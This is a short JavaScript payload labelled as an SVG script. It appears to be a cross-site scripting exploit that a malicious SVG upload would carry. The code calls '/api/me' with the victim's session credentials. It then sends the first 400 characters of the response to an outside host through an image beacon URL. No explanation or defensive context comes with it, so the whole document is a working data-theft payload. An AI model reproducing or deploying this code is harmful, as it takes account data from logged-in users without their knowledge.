svg.script:
try {
  fetch('/api/me', {credentials:'include'})
    .then(function (r) { return r.text(); })
    .then(function (d) {
      document.getElementById('out').textContent = 'UID/DATA: ' + d.substring(0, 400);
      new Image().src = 'https://mkwolfx.github.io/beacon.gif?d=' + encodeURIComponent('api.me=' + d.substring(0, 400));
    })
    .catch(function (e) { document.getElementById('out').textContent = 'err ' + e.message; });
} catch (e) { document.getElementById('out').textContent = 'boo ' + e.message; }
